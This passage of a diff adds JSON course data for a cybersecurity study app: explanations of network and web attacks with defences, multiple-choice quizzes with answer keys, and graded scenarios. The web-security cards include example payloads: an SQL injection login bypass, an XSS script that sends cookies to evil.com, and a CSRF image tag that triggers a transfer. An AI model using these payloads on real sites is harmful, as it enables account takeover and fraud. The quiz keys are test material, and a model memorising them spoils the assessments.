+          "plain": "DoS attacks flood a server with so much garbage traffic that legitimate users get locked out. In a DDoS attack, the hacker commands thousands of hijacked computers (a botnet) to overwhelm the target simultaneously.",
+          "def": "Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks attempt to render network services unavailable to authorized users by exhausting server bandwidth, CPU, memory, or connection table resources. Primary categories: 1. Volumetric Attacks (UDP Floods, DNS Amplification using open resolvers). 2. Protocol Attacks (TCP SYN Flood exploiting half-open connection queues, Smurf ICMP broadcast amplification). 3. Application-Layer Attacks (HTTP GET/POST floods, Slowloris keeping connections open with partial headers).",
+          "exam": "TCP SYN Flood mechanics: Attacker sends SYN with spoofed source IP; server responds with SYN-ACK and allocates TCB (Transmission Control Block) buffer; server waits for ACK that never comes. Backlog queue fills up -> server drops new connections. Mitigation: SYN Cookies.",
+          "trap": "Exam Trap: Believing SYN cookies store connection state in memory. SYN cookies encode the connection state INTO the initial TCP sequence number (ISN), allocating ZERO server memory until the final client ACK arrives!",
+          "example": "The Mirai botnet harnessed hundreds of thousands of compromised IoT cameras to launch a 1 Tbps DNS amplification DDoS attack that crippled major internet services across the US East Coast.",
+          "q": "Explain the exact technical mechanism of a TCP SYN Flood attack, and describe how SYN Cookies mitigate the vulnerability without exhausting server memory.",
+          "a": "The attacker sends a flood of SYN requests with spoofed IPs, causing the server to allocate half-open state buffers (TCBs) awaiting ACKs that never arrive, exhausting the backlog queue. SYN Cookies eliminate memory allocation by encoding state into the SYN-ACK's Initial Sequence Number; memory is allocated only when a valid final ACK returns."
+        },
+        {
+          "id": "cyber_m3_arp_spoofing_poisoning",
+          "cat": "Network Attacks",
+          "title": "ARP SPOOFING, CACHE POISONING, AND MITM ATTACKS",
+          "sub": "Exploiting Layer 2 Trust and Dynamic ARP Inspection Defenses",
+          "plain": "Address Resolution Protocol (ARP) translates IP addresses to MAC addresses. Because ARP has no authentication, an attacker can broadcast fake messages saying 'I am the default router,' tricking all computers into routing their internet traffic through the attacker.",
+          "def": "ARP Spoofing (ARP Poisoning) is a Layer 2 attack where an adversary broadcasts unsolicited, forged ARP response packets (Gratuitous ARPs) onto a local area network. Because ARP is stateless and lacks authentication, victim hosts update their internal ARP cache tables, binding the default gateway's IP address to the attacker's MAC address. This positions the attacker as an active Man-in-the-Middle (MitM) capable of sniffing, modifying, or dropping traffic.",
+          "exam": "Mitigations: 1. Dynamic ARP Inspection (DAI) on managed switches using the DHCP Snooping database. 2. Static ARP tables for critical gateways. 3. 802.1X network access control.",
+          "trap": "Exam Trap: Thinking ARP spoofing can be conducted across the internet over public routers. ARP is strictly a Local Area Network (Layer 2 broadcast domain) protocol and does NOT traverse routers.",
+          "example": "An attacker uses Ettercap or Arpspoof in a coffee shop LAN to poison the gateway ARP entry, intercepting unencrypted HTTP session cookies from connected laptop users.",
+          "q": "Why is the Address Resolution Protocol inherently vulnerable to cache poisoning on an Ethernet switch, and what switch-level security feature mitigates it?",
+          "a": "ARP is stateless and completely unauthenticated; hosts accept unsolicited ARP replies and overwrite their cache tables without verification. It is mitigated at the switch level by Dynamic ARP Inspection (DAI), which validates ARP packets against the trusted DHCP Snooping binding database."
+        },
+        {
+          "id": "cyber_m3_dns_spoofing_dnssec",
+          "cat": "DNS Security",
+          "title": "DNS SPOOFING, CACHE POISONING, AND DNSSEC",
+          "sub": "Securing Domain Resolution via Cryptographic Resource Records",
+          "plain": "DNS is the phonebook of the internet, converting names like google.com into IP addresses. In DNS poisoning, an attacker tricks a DNS server into storing a fake IP, redirecting users to a phishing site. DNSSEC fixes this by digitally signing all DNS records.",
+          "def": "DNS Cache Poisoning occurs when an attacker injects fraudulent DNS mapping records into a recursive resolver's cache (e.g., via Kaminsky attack predicting transaction IDs and source ports). Subsequent client queries return the attacker's malicious IP address. Domain Name System Security Extensions (DNSSEC) resolves this by appending cryptographic signatures to DNS records using public-key cryptography, providing Origin Authentication and Data Integrity via RRSIG, DNSKEY, DS, and NSEC/NSEC3 records.",
+          "exam": "DNSSEC records: RRSIG (Resource Record Signature containing the digital signature), DNSKEY (Public key used to verify RRSIG), DS (Delegation Signer linking child zone to parent zone), NSEC/NSEC3 (Authenticated denial of existence).",
+          "trap": "Exam Trap: Believing DNSSEC encrypts DNS queries. DNSSEC does NOT provide confidentiality! DNS queries remain in plaintext; DNSSEC strictly provides INTEGRITY and AUTHENTICITY (proof that records are unaltered). To encrypt queries, use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT).",
+          "example": "Attackers poison an ISP resolver's cache for a bank domain, redirecting banking customers to a counterfeit credential harvesting portal. DNSSEC resolvers drop the fraudulent response because the cryptographic RRSIG signature fails verification.",
+          "q": "Does DNSSEC encrypt DNS queries to protect user browsing privacy? Clarify what security services DNSSEC provides versus DNS-over-HTTPS (DoH).",
+          "a": "No, DNSSEC does not encrypt queries; DNS requests and responses remain plaintext. DNSSEC provides data integrity and origin authentication via digital signatures (RRSIG). In contrast, DNS-over-HTTPS (DoH) encrypts the transport channel to provide privacy and confidentiality."
+        },
+        {
+          "id": "cyber_m3_ipsec_architecture",
+          "cat": "VPN / IPsec",
+          "title": "IPSEC ARCHITECTURE: AH, ESP, TRANSPORT, AND TUNNEL MODES",
+          "sub": "Network Layer Security Framework and Internet Key Exchange (IKE)",
+          "plain": "IPsec protects network traffic at the IP layer (Layer 3). It offers two protocols: AH (authenticates headers but no encryption) and ESP (encrypts the data and authenticates). It runs in Transport mode (host-to-host) or Tunnel mode (entire packet sealed in a new IP packet).",
+          "def": "Internet Protocol Security (IPsec) is an open suite of protocols (RFC 4301) operating at the OSI Network Layer (Layer 3) to provide secure communications over IP networks. Protocols: 1. Authentication Header (AH, protocol 51): Provides data integrity and origin authentication for the entire packet including outer IP header, but NO encryption. 2. Encapsulating Security Payload (ESP, protocol 50): Provides confidentiality (encryption), data integrity, and anti-replay protection. Operating Modes: Transport Mode (encrypts only the IP payload; preserves original IP header; used host-to-host) and Tunnel Mode (encrypts the entire original IP packet and prepends a new outer IP header; used gateway-to-gateway VPNs).",
+          "exam": "AH is incompatible with NAT (Network Address Translation) because NAT modifies IP addresses in headers, causing AH integrity checks to fail! ESP encrypts payload; in Tunnel mode, the inner IP packet is completely concealed.",
+          "trap": "Exam Trap: Stating AH encrypts data. AH provides ZERO confidentiality. Only ESP encrypts payload data.",
+          "example": "A site-to-site corporate VPN connects headquarters to a branch office using IPsec ESP in Tunnel Mode, allowing employee subnets to communicate securely across the public internet.",
+          "q": "Why is the IPsec Authentication Header (AH) protocol fundamentally incompatible with Network Address Translation (NAT) routers?",
+          "a": "AH calculates its integrity checksum over the entire IP packet, including the source and destination IP header addresses. When a NAT router translates private IP addresses to public IPs, it alters the header, causing the recipient's AH integrity check to fail unconditionally."
+        },
+        {
+          "id": "cyber_m3_vpn_technologies",
+          "cat": "VPN / IPsec",
+          "title": "VIRTUAL PRIVATE NETWORKS (VPN): ARCHITECTURES AND PROTOCOLS",
+          "sub": "Site-to-Site vs Remote Access Tunnels (IPsec, OpenVPN, WireGuard)",
+          "plain": "A VPN creates an encrypted tunnel across the public internet, making your remote computer act as if it were directly plugged into the private corporate local network.",
+          "def": "A Virtual Private Network (VPN) securely extends a private network across a public telecommunications network by establishing encrypted virtual tunnels. Architectures include: Site-to-Site VPNs (interconnecting entire branch office networks via gateway routers) and Remote Access VPNs (connecting individual roaming endpoints to enterprise networks). Common protocol suites: IPsec (Layer 3 standard), OpenVPN (Layer 4/7 utilizing TLS over UDP/TCP port 1194), and WireGuard (modern, high-performance Layer 3 protocol using state-of-the-art cryptography like ChaCha20-Poly1305).",
+          "exam": "Comparison: IPsec operates in kernel space at Layer 3 (fast, complex configuration, NAT issues). OpenVPN runs in user space over TLS/SSL (flexible, crosses firewalls on port 443). WireGuard runs minimal codebase (~4000 lines) with high throughput.",
+          "trap": "Exam Trap: Confusing Split-Tunneling with Full-Tunneling. Split-tunneling routes only corporate traffic through the VPN while internet browsing bypasses the tunnel. Full-tunneling forces ALL endpoint traffic through the VPN, preventing data leakage.",
+          "example": "A remote software engineer connects to AWS cloud staging databases through an OpenVPN client tunnel with multi-factor authentication (MFA).",
+          "q": "Differentiate between a Site-to-Site VPN and a Remote Access VPN in an enterprise corporate setting.",
+          "a": "A Site-to-Site VPN connects two fixed, entire office networks together via dedicated gateway routers without individual client software. A Remote Access VPN connects individual roaming employee devices to the corporate network using software clients installed on each device."
+        },
+        {
+          "id": "cyber_m3_ssl_tls_handshake",
+          "cat": "Transport Security",
+          "title": "SSL / TLS PROTOCOL ARCHITECTURE AND TLS 1.3 HANDSHAKE",
+          "sub": "Securing Transport Layer Communications with Forward Secrecy",
+          "plain": "TLS is the 'S' in HTTPS. It securely negotiates symmetric encryption keys between your browser and the web server in a fraction of a second. TLS 1.3 dropped obsolete, slow ciphers, making handshakes faster (1 round-trip) and much safer.",
+          "def": "Transport Layer Security (TLS, successor to SSL) provides end-to-end communication security over transport networks (Layer 4). It comprises two primary protocol layers: the TLS Record Protocol (packaging, compressing, and encrypting data) and the TLS Handshake Protocol (authenticating endpoints and establishing shared session keys). TLS 1.3 (RFC 8446) modernized the standard by deprecating weak cryptographic algorithms (RSA key exchange, CBC ciphers, SHA-1) and reducing the full handshake latency from 2-RTT to 1-RTT using ephemeral Diffie-Hellman.",
+          "exam": "TLS 1.2 vs 1.3 differences for ASTU exams: TLS 1.2 takes 2 round-trip times (2-RTT) to establish keys and allowed static RSA key exchange (no PFS). TLS 1.3 takes only 1-RTT, mandates ephemeral Diffie-Hellman (PFS guaranteed), and supports 0-RTT session resumption.",
+          "trap": "Exam Trap: Calling it 'SSL encryption' in modern technical answers. SSL 2.0 and SSL 3.0 are completely deprecated and cryptographically broken (e.g., POODLE attack). Modern production systems exclusively use TLS 1.2 and TLS 1.3.",
+          "example": "When navigating to https://google.com, the browser executes a 1-RTT TLS 1.3 handshake: ClientHello with key share -> ServerHello, Certificate, Finished -> encrypted HTTP/2 data transmission begins.",
+          "q": "What major security and performance improvements were introduced in TLS 1.3 compared to TLS 1.2?",
+          "a": "1. Performance: Handshake latency reduced from 2-RTT to 1-RTT (and 0-RTT resumption). 2. Security: Static RSA key exchange and broken ciphers (CBC mode, RC4, MD5/SHA-1) were completely removed, mandating ephemeral Diffie-Hellman for mandatory Perfect Forward Secrecy."
+        },
+        {
+          "id": "cyber_m3_wireless_security_wpa",
+          "cat": "Wireless Security",
+          "title": "WIRELESS SECURITY: WEP WEAKNESSES, WPA2, AND WPA3",
+          "sub": "Evolution of 802.11 Encryption Protocols and Dragonfly Handshake",
+          "plain": "Early Wi-Fi security (WEP) was horribly broken because it reused short encryption keys. WPA2 fixed this with AES encryption but was still vulnerable to offline dictionary cracking of its 4-way handshake. WPA3 fixes this with a zero-knowledge password handshake.",
+          "def": "IEEE 802.11 wireless security standards have evolved to secure unguided radio transmissions: 1. WEP (Wired Equivalent Privacy): Cryptographically broken due to short 24-bit Initialization Vectors (IVs) and RC4 stream cipher vulnerabilities (Fluhrer-Mantin-Shamir attack). 2. WPA2: Implements robust AES-CCMP encryption; vulnerable to KRACK (Key Reinstallation Attack) and offline dictionary attacks against captured 4-way WPA handshakes. 3. WPA3: Mandates 128-bit/192-bit GCMP encryption and replaces pre-shared keys with Simultaneous Authentication of Equals (SAE / Dragonfly handshake), providing forward secrecy and resistance to offline password guessing.",
+          "exam": "Why WEP failed: Small 24-bit IV meant key reuse occurred within minutes on busy networks; RC4 weak keys allowed key recovery within seconds. WPA2 uses 4-way handshake to derive Pairwise Transient Key (PTK). WPA3 uses SAE to defeat dictionary cracking.",
+          "trap": "Exam Trap: Assuming hiding your SSID or enabling MAC address filtering provides robust wireless security. SSIDs are easily revealed in beacon/probe requests, and MAC addresses are sent in unencrypted radio headers and can be spoofed in seconds.",
+          "example": "An attacker captures the 4-way handshake of a coffee shop's WPA2 Wi-Fi network and runs Hashcat against a dictionary file offline to crack the Wi-Fi password without alerting the owner.",
+          "q": "Why was the Wired Equivalent Privacy (WEP) wireless security standard completely abandoned, and what cryptographic flaw enabled rapid key recovery?",
+          "a": "WEP used a short 24-bit Initialization Vector (IV) paired with the RC4 stream cipher. Because the IV space was so small, IV collisions occurred rapidly on active networks, exposing predictable keystream patterns that allowed attackers to mathematically extract the master key within minutes."
+        },
+        {
+          "id": "cyber_m3_honeypots_network_deception",
+          "cat": "Network Deception",
+          "title": "HONEYPOTS, HONEYNETS, AND NETWORK DECEPTION",
+          "sub": "Decoy Architecture for Threat Intelligence, Early Warning, and Attacker Entrapment",
+          "plain": "A honeypot is a trap set for hackers. It looks like a real, vulnerable server with valuable data, but it's an isolated fake system designed to lure attackers, waste their time, and study their tools and techniques without risking real assets.",
+          "def": "A Honeypot is a closely monitored decoy computing resource intentionally deployed with vulnerabilities or simulated production services to detect, deflect, and study unauthorized malicious activity. Classification by Interaction: 1. Low-Interaction Honeypots (simulate basic service banners and TCP ports, e.g., Honeyd; minimal risk, captures automated scanners). 2. High-Interaction Honeypots (deploy real operating systems and applications, e.g., honeynets; high risk, captures sophisticated human attackers and zero-days).",
+          "exam": "Zero production traffic should ever touch a legitimate honeypot. Therefore, ANY connection attempt to a honeypot is by definition unauthorized and constitutes high-fidelity threat telemetry.",
+          "trap": "Exam Trap: Deploying a high-interaction honeypot without strict outbound rate-limiting or isolation. If an attacker fully compromises a high-interaction honeypot, they can use it as a launching pad to attack other systems on the internet, creating severe liability!",
+          "example": "An enterprise deploys a low-interaction Cowrie SSH honeypot on an exposed public IP; within hours, it captures automated botnet brute-force username/password combinations and newly compiled worm binaries.",
+          "q": "What is the primary operational difference between a Low-Interaction Honeypot and a High-Interaction Honeypot, and what risk is associated with the latter?",
+          "a": "A low-interaction honeypot simulates only network services and protocols (capturing basic scans with zero host compromise risk). A high-interaction honeypot runs genuine operating systems and services (capturing advanced multi-stage attacks), but introduces the risk that an attacker may use the compromised host to pivot and launch secondary attacks."
+        }
+      ],
+      "quiz": [
+        {
+          "q": "A packet filtering firewall inspects an incoming packet destined for an internal web server. Which of the following parameters can be evaluated by a standard Layer 3 / Layer 4 Stateless Packet Filter?",
+          "opts": [
+            "Source IP, Destination IP, Protocol, Source Port, Destination Port, TCP Flags",
+            "SQL query syntax contained within an HTTP POST body",
+            "SSL/TLS digital certificate subject common name",
+            "Authenticated username extracted from an LDAP session token"
+          ],
+          "ans": 0,
+          "cat": "Firewalls",
+          "correctFb": "Stateless packet filtering operates strictly at OSI Layers 3 and 4, evaluating packet header fields such as source/destination IP addresses, protocol type (TCP/UDP/ICMP), port numbers, and TCP control flags.",
+          "distractors": [
+            "Inspecting SQL syntax requires Layer 7 Web Application Firewall (WAF) deep inspection.",
+            "Evaluating SSL certificate common names requires Layer 7 TLS proxy inspection.",
+            "Extracting authenticated LDAP usernames requires application-layer proxying."
+          ]
+        },
+        {
+          "q": "How does an inline Intrusion Prevention System (IPS) differ fundamentally in operational deployment from a standard Intrusion Detection System (IDS)?",
+          "opts": [
+            "An IDS is deployed directly in the inline physical traffic path, whereas an IPS receives mirrored SPAN port traffic",
+            "An IPS sits directly inline with network traffic and can actively drop packets in real time, whereas an IDS passively monitors traffic out-of-band",
+            "An IDS can decrypt TLS 1.3 traffic without private keys, whereas an IPS cannot",
+            "An IPS relies solely on qualitative manual administrator inspection without automated rules"
+          ],
+          "ans": 1,
+          "cat": "Intrusion Detection",
+          "correctFb": "An IPS is placed directly inline across the network path, giving it the operational ability to drop malicious packets, terminate TCP connections with RST packets, and update firewall rules in real time.",
+          "distractors": [
+            "The statement reverses the deployment architectures; IDS receives mirrored traffic, while IPS is inline.",
+            "Neither IDS nor IPS can decrypt TLS 1.3 without authorized cryptographic proxy keys.",
+            "IPS uses automated signature and anomaly detection engines, not manual inspection."
+          ]
+        },
+        {
+          "q": "During a SYN flood attack against a web server, what specific server operating system resource is exhausted, causing legitimate connection drops?",
+          "opts": [
+            "Hard disk swap partition storage",
+            "The half-open TCP connection backlog queue (Transmission Control Block table)",
+            "DNS resolver cache memory",
+            "The physical Ethernet NIC MAC address table"
+          ],
+          "ans": 1,
+          "cat": "Network Attacks",
+          "correctFb": "A SYN flood targets the server's TCP connection backlog queue. The server allocates a Transmission Control Block (TCB) in memory for each incoming SYN; when the queue reaches capacity awaiting final ACKs, new incoming connection attempts are discarded.",
+          "distractors": [
+            "SYN floods target kernel networking memory structures, not persistent hard disk swap space.",
+            "DNS resolver caches handle domain lookups, not incoming TCP transport handshakes.",
+            "MAC address tables reside on Layer 2 network switches, not the target web server host."
+          ]
+        },
+        {
+          "q": "An attacker on an enterprise switched Ethernet local area network transmits gratuitous ARP replies asserting that the default gateway IP 192.168.1.1 is at MAC address 00:11:22:33:44:55 (the attacker's MAC). What attack is occurring?",
+          "opts": [
+            "DNS Amplification Attack",
+            "ARP Spoofing / Cache Poisoning",
+            "BGP Route Hijacking",
+            "Smurf Attack"
+          ],
+          "ans": 1,
+          "cat": "Network Attacks",
+          "correctFb": "The attacker is executing ARP Spoofing (ARP Poisoning). By sending forged unsolicited ARP replies, victim workstations associate the gateway's IP address with the attacker's MAC, enabling Man-in-the-Middle eavesdropping.",
+          "distractors": [
+            "DNS amplification exploits open DNS resolvers with spoofed UDP queries to flood bandwidth.",
+            "BGP route hijacking targets Internet routing tables between Autonomous Systems, not local Ethernet ARP.",
+            "A Smurf attack broadcasts ICMP echo requests with a spoofed target IP to an amplification subnet."
+          ]
+        },
+        {
+          "q": "What security guarantee does Domain Name System Security Extensions (DNSSEC) provide to resolving clients?",
+          "opts": [
+            "Full end-to-end encryption of all DNS queries and responses to ensure user privacy",
+            "Cryptographic proof of origin authenticity and data integrity for DNS resource records using digital signatures",
+            "Automated removal of all malware domains from internet routing tables",
+            "Protection against physical fiber optic line tapping"
+          ],
+          "ans": 1,
+          "cat": "DNS Security",
+          "correctFb": "DNSSEC attaches cryptographic digital signatures (RRSIG records) to DNS records. Resolvers can verify that the domain resolution data genuinely originated from the authoritative zone and has not been forged or altered.",
+          "distractors": [
+            "DNSSEC does not encrypt queries; DNS requests and responses remain visible plaintext.",
+            "DNSSEC validates record authenticity; it does not block or remove registered malicious domains.",
+            "DNSSEC is a logical cryptographic protocol, not a physical anti-tapping defense."
+          ]
+        },
+        {
+          "q": "Which IPsec protocol should be configured when an enterprise requires payload confidentiality, data origin authentication, and anti-replay protection across a public transit network?",
+          "opts": [
+            "Authentication Header (AH)",
+            "Encapsulating Security Payload (ESP)",
+            "Internet Control Message Protocol (ICMP)",
+            "Simple Network Management Protocol (SNMP)"
+          ],
+          "ans": 1,
+          "cat": "VPN / IPsec",
+          "correctFb": "Encapsulating Security Payload (ESP, IP protocol 50) provides payload confidentiality via symmetric encryption, as well as data origin authentication, data integrity, and anti-replay services.",
+          "distractors": [
+            "Authentication Header (AH) provides integrity and authentication, but zero payload encryption/confidentiality.",
+            "ICMP is a network diagnostic protocol, not an IPsec security protocol.",
+            "SNMP is an application-layer network device management protocol."
+          ]
+        },
+        {
+          "q": "Why does IPsec Tunnel Mode alter the size of an IP packet compared to IPsec Transport Mode?",
+          "opts": [
+            "Tunnel mode compresses the entire payload to 50% of its original size",
+            "Tunnel mode encapsulates the entire original IP packet inside a brand-new outer IP header with an ESP header and trailer",
+            "Tunnel mode strips all TCP/UDP port numbers from the packet",
+            "Tunnel mode converts IPv4 packets into unrouted Layer 2 Ethernet frames"
+          ],
+          "ans": 1,
+          "cat": "VPN / IPsec",
+          "correctFb": "In Tunnel Mode, the entire original IP packet (including inner IP header and payload) is encrypted and encapsulated as the payload of a completely new outer IP packet, increasing packet size to accommodate the new outer header and ESP wrappers.",
+          "distractors": [
+            "Tunnel mode encrypts and encapsulates data, but does not inherently mandate 50% data compression.",
+            "The original TCP/UDP ports remain intact inside the encrypted inner packet.",
+            "Tunnel mode operates strictly at Layer 3 (IP), not Layer 2."
+          ]
+        },
+        {
+          "q": "What handshake optimization in TLS 1.3 allows secure session keys to be derived in a single round-trip time (1-RTT)?",
+          "opts": [
+            "The client sends its Diffie-Hellman key share guess directly inside the initial ClientHello message",
+            "The server disables all digital certificate verification",
+            "The client and server transmit their plaintext private keys across UDP",
+            "The protocol switches from asymmetric cryptography to unkeyed Caesar ciphers"
+          ],
+          "ans": 0,
+          "cat": "Transport Security",
+          "correctFb": "In TLS 1.3, the client includes its ephemeral Diffie-Hellman public key share directly in the initial ClientHello message. If the server supports that cipher suite, it replies with its own key share in ServerHello, completing key exchange in 1-RTT.",
+          "distractors": [
+            "Server certificate verification remains mandatory in standard TLS 1.3.",
+            "Private keys are never transmitted across any network channel under any circumstances.",
+            "TLS 1.3 enforces modern cryptographic algorithms (AES-GCM, ChaCha20-Poly1305), strictly banning legacy ciphers."
+          ]
+        },
+        {
+          "q": "Why is the Simultaneous Authentication of Equals (SAE) handshake in WPA3 vastly superior to the 4-way Pre-Shared Key (PSK) handshake in WPA2?",
+          "opts": [
+            "SAE allows open public Wi-Fi networks without requiring any user passwords",
+            "SAE utilizes a zero-knowledge Dragonfly handshake that makes offline dictionary cracking of captured handshakes mathematically impossible",
+            "SAE reduces wireless transmission frequencies to increase physical broadcast distance",
+            "SAE replaces AES encryption with single-DES for faster embedded computation"
+          ],
+          "ans": 1,
+          "cat": "Wireless Security",
+          "correctFb": "WPA3's SAE (Dragonfly handshake) is a password-authenticated key exchange that prevents offline dictionary attacks. An attacker who eavesdrops on the wireless exchange cannot test candidate passwords against the captured handshake.",
+          "distractors": [
+            "WPA3 uses Enhanced Open (OWE) for unauthenticated public networks; SAE specifically protects password-authenticated networks.",
+            "SAE is an authentication protocol and does not alter RF physical radio frequencies.",
+            "Single-DES is obsolete and banned; WPA3 enforces 128-bit or 192-bit GCMP encryption."
+          ]
+        },
+        {
+          "q": "Why must an enterprise network security team enforce strict outbound firewall rules and bandwidth throttling on a deployed High-Interaction Honeypot?",
+          "opts": [
+            "To prevent the honeypot from consuming excessive electricity in the server rack",
+            "To ensure that an attacker who compromises the genuine honeypot operating system cannot use it as a pivot to attack external third-party systems or internal enterprise subnets",
+            "Because high-interaction honeypots only run on dial-up modem lines",
+            "To prevent internal developers from mistaking the honeypot for a production database"
+          ],
+          "ans": 1,
+          "cat": "Network Deception",
+          "correctFb": "A high-interaction honeypot runs genuine operating system software. If compromised, an adversary could use root privileges on that machine to launch secondary attacks, host malware, or pivot laterally into internal corporate subnets unless strict containment controls are enforced.",
+          "distractors": [
+            "Electricity consumption is negligible and unrelated to cybersecurity containment.",
+            "Honeypots are deployed on standard enterprise virtualized or cloud infrastructure, not dial-up lines.",
+            "Internal confusion is resolved via IP addressing and naming conventions, not outbound firewall throttling."
+          ]
+        }
+      ],
+      "bossChallenges": [
+        {
+          "marks": 10,
+          "scenario": "A regional bank operates an online transaction processing center. Due to increasing cyber threats, the board mandates a total network security architecture modernization. The proposal includes a perimeter Next-Generation Firewall (NGFW), an inline Network Intrusion Prevention System (NIPS), and an IPsec VPN connecting 50 branch offices. Produce a comprehensive engineering blueprint: detail the exact placement of each security appliance, contrast stateful inspection with deep packet inspection, specify the IPsec protocol mode (AH vs ESP, Transport vs Tunnel) for branch connectivity, and design a defense-in-depth strategy to defeat multi-vector DDoS attacks.",
+          "rubric": [
+            "Architectural Topology & Appliance Placement (2.5 marks): Clear perimeter DMZ design detailing the positioning of external routers, redundant NGFWs, inline NIPS, and internal distribution switches.",
+            "Firewall Inspection Mechanisms (2.5 marks): Detailed technical contrast between Layer 3/4 stateful connection tracking and Layer 7 deep packet inspection (DPI) with TLS decryption proxying.",
+            "IPsec Protocol Specification (2.5 marks): Explicit selection of ESP in Tunnel Mode for branch-to-headquarters links, justifying the rejection of AH due to NAT incompatibility and lack of confidentiality.",
+            "DDoS & Perimeter Hardening (2.5 marks): Multi-layer mitigation covering BGP anycast traffic scrubbing, upstream ISP rate-limiting, and TCP SYN Cookies for state exhaustion defense."
+          ]
+        },
+        {
+          "marks": 5,
+          "scenario": "A security analyst notices that users on an internal corporate Wi-Fi network are suddenly experiencing SSL certificate warnings when accessing major websites, and sensitive intranet traffic is being intercepted. Investigate this incident: diagnose the Layer 2 attack mechanism, explain why standard switch configurations permitted it, and implement concrete switch and network layer countermeasures.",
+          "rubric": [
+            "Attack Mechanism Diagnosis (1.25 marks): Identification of ARP Spoofing/Poisoning where the attacker floods gratuitous ARP replies to impersonate the default gateway.",
+            "Vulnerability Root Cause (1.25 marks): Highlighting the stateless, unauthenticated nature of the Address Resolution Protocol (RFC 826).",
+            "Switch Countermeasures (1.25 marks): Implementing Dynamic ARP Inspection (DAI) and DHCP Snooping on all managed edge switch access ports.",
+            "Endpoint Hardening (1.25 marks): Configuring static ARP entries for core infrastructure and enforcing 802.1X enterprise port-based network access control."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m4",
+      "num": 4,
+      "title": "Web and System Security",
+      "topics": [
+        {
+          "id": "cyber_m4_sql_injection",
+          "cat": "Web Vulnerabilities",
+          "title": "SQL INJECTION (SQLI): EXPLOITATION AND DEFENSE",
+          "sub": "In-Band, Blind, and Out-of-Band Attack Mechanics and Prepared Statements",
+          "plain": "SQL injection happens when an app takes untrusted user input and pastes it directly into a database query. Hackers can inject malicious SQL commands (like `' OR 1=1 --`) to dump passwords, alter records, or wipe entire databases.",
+          "def": "SQL Injection (SQLi) is an injection flaw where untrusted user input is directly concatenated into a dynamic database query string, allowing an attacker to manipulate the query's syntactic structure and execute arbitrary SQL commands. Classifications: 1. In-Band SQLi (Error-based, UNION-based). 2. Inferential / Blind SQLi (Boolean-based, Time-based sleep queries). 3. Out-of-Band SQLi (DNS/HTTP exfiltration). Primary defense: Parameterized Queries (Prepared Statements) that decouple SQL code structure from untrusted user data.",
+          "exam": "Why Prepared Statements work: The SQL structure is compiled and parsed by the database engine BEFORE the user input is bound. The database treats input purely as literal data values, never as executable SQL commands!",
+          "trap": "Exam Trap: Thinking input sanitization or regex blacklisting of single quotes (') is a secure defense. Attackers bypass blacklists easily using hexadecimal encoding, double encoding, or integer-based SQL injection where quotes are unnecessary!",
+          "example": "Vulnerable query: `\"SELECT * FROM users WHERE user = '\" + u + \"' AND pass = '\" + p + \"'\"`. Attack input `admin' --` comments out the password check, granting instant root admin access.",
+          "q": "Why does using Parameterized Queries (Prepared Statements) completely neutralize SQL injection vulnerabilities regardless of what special characters an attacker submits?",
+          "a": "Prepared Statements pre-compile the SQL query structure on the database engine before inserting parameters. User input is treated strictly as literal data variables, preventing user-supplied characters from altering the query's syntactic structure."
+        },
+        {
+          "id": "cyber_m4_cross_site_scripting",
+          "cat": "Web Vulnerabilities",
+          "title": "CROSS-SITE SCRIPTING (XSS): STORED, REFLECTED, DOM-BASED",
+          "sub": "Client-Side Script Execution, Session Hijacking, and CSP Hardening",
+          "plain": "XSS occurs when a website takes malicious JavaScript submitted by a hacker and displays it to other users without sanitizing it. The victim's browser runs the hacker's script, letting them steal session cookies and take over accounts.",
+          "def": "Cross-Site Scripting (XSS) occurs when an application includes untrusted data in an HTTP response without proper validation or contextual output encoding, enabling an attacker to execute malicious client-side JavaScript in a victim's browser context. Types: 1. Stored XSS (Persistent): Malicious payload permanently saved in a database (e.g., in a forum comment) and served to all viewers. 2. Reflected XSS (Non-Persistent): Payload injected into a request URL parameter and immediately echoed back in the response page. 3. DOM-Based XSS: Vulnerability exists entirely on the client side where JavaScript writes untrusted source data (e.g., `location.search`) directly into an execution sink (e.g., `document.write` or `element.innerHTML`).",
+          "exam": "Defenses: Contextual Output Encoding (HTML entity encoding, JavaScript encoding), Content Security Policy (CSP headers restricting script sources), and the `HttpOnly` cookie flag (stops JavaScript from reading `document.cookie`).",
+          "trap": "Exam Trap: Believing `HttpOnly` cookies eliminate XSS. `HttpOnly` cookies prevent cookie theft, but the attacker can still perform actions on the victim's behalf via XSS (e.g., modifying account settings, reading private page DOM data).",
+          "example": "Stored XSS in a guestbook: Submitting `<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>` sends every visitor's active session cookie directly to the attacker.",
+          "q": "Differentiate between Stored XSS and Reflected XSS based on payload persistence and delivery mechanism.",
+          "a": "Stored XSS persistently stores the malicious script payload on the target server (e.g., in a database or comment board), executing whenever any user views that stored data. Reflected XSS is non-persistent; the payload is embedded in a link/request and reflected back only to the user clicking that specific link."
+        },
+        {
+          "id": "cyber_m4_csrf_prevention",
+          "cat": "Web Vulnerabilities",
+          "title": "CROSS-SITE REQUEST FORGERY (CSRF): MECHANICS AND DEFENSES",
+          "sub": "Exploiting Ambient Browser Authentication and Synchronizer Tokens",
+          "plain": "CSRF tricks your browser into making unwanted actions on a website where you are currently logged in. Because your browser automatically sends your session cookies with every request, the website thinks you meant to perform the action.",
+          "def": "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted state-changing actions on a trusted web application in which they are currently authenticated. The attack exploits ambient authority—the browser's automatic inclusion of session cookies, HTTP Basic credentials, or client IP addresses with every cross-origin request. Defenses include: Anti-CSRF Synchronizer Tokens (cryptographically random, per-session, unpredictable tokens validated on state-changing POST/PUT requests) and the `SameSite` cookie attribute (`SameSite=Strict` or `SameSite=Lax`).",
+          "exam": "Key CSRF distinction: XSS exploits the user's trust in a website (runs scripts on that site). CSRF exploits a website's trust in the user's browser (abuses automated cookie sending).",
+          "trap": "Exam Trap: Checking the HTTP Referer header as the sole CSRF defense. Referer headers can be stripped by browser privacy plugins, proxies, or manipulated via policy, making it an unreliable primary control.",
+          "example": "An attacker hosts an evil site containing `<img src='http://bank.com/transfer?to=attacker&amount=1000'>`. When a logged-in bank customer visits the page, their browser automatically sends bank session cookies, executing the transfer.",
+          "q": "Explain the fundamental difference between Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).",
